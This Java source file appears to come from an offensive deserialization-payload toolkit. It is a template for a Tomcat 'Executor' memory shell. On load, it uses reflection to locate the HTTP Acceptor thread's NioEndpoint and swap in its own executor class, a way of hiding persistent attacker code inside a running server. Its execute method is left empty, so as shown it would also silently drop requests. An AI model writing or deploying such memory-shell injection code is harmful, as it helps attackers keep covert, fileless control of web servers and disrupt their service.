package org.su18.ysuserial.payloads.templates.memshell.tomcat;


import org.apache.tomcat.util.net.NioEndpoint;
import org.apache.tomcat.util.threads.ThreadPoolExecutor;


import java.util.concurrent.*;

/**
 * Tomcat Executor 内存马
 *
 * @author su18
 */
public class TEXMSFromThread extends ThreadPoolExecutor {


	static {
		try {
			NioEndpoint        nioEndpoint = (NioEndpoint) getStandardService();
			ThreadPoolExecutor exec        = (ThreadPoolExecutor) getFieldValue(nioEndpoint, "executor");
			nioEndpoint.setExecutor(new TEXMSFromThread(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler()));
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public TEXMSFromThread(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) {
		super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);
	}


	@Override
	public void execute(Runnable command) {
	}

	public static Object getStandardService() throws Exception {
		Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");
		for (Thread thread : threads) {
			if (thread == null) {
				continue;
			}
			if ((thread.getName().contains("Acceptor")) && (thread.getName().contains("http"))) {
				Object target      = getFieldValue(thread, "target");
				Object jioEndPoint = null;
				try {
					jioEndPoint = getFieldValue(target, "this$0");
				} catch (Exception e) {
					e.printStackTrace();
				}

				return jioEndPoint == null ? getFieldValue(target, "endpoint") : jioEndPoint;
			}
		}
		return new Object();
	}


	public static Object getFieldValue(Object obj, String fieldName) throws Exception {
		java.lang.reflect.Field f = null;
		if (obj instanceof java.lang.reflect.Field) {
			f = (java.lang.reflect.Field) obj;
		} else {
			Class cs = obj.getClass();
			while (cs != null) {
				try {
					f = cs.getDeclaredField(fieldName);
					cs = null;
				} catch (Exception e) {
					cs = cs.getSuperclass();
				}
			}
		}
		f.setAccessible(true);
		return f.get(obj);
	}

}
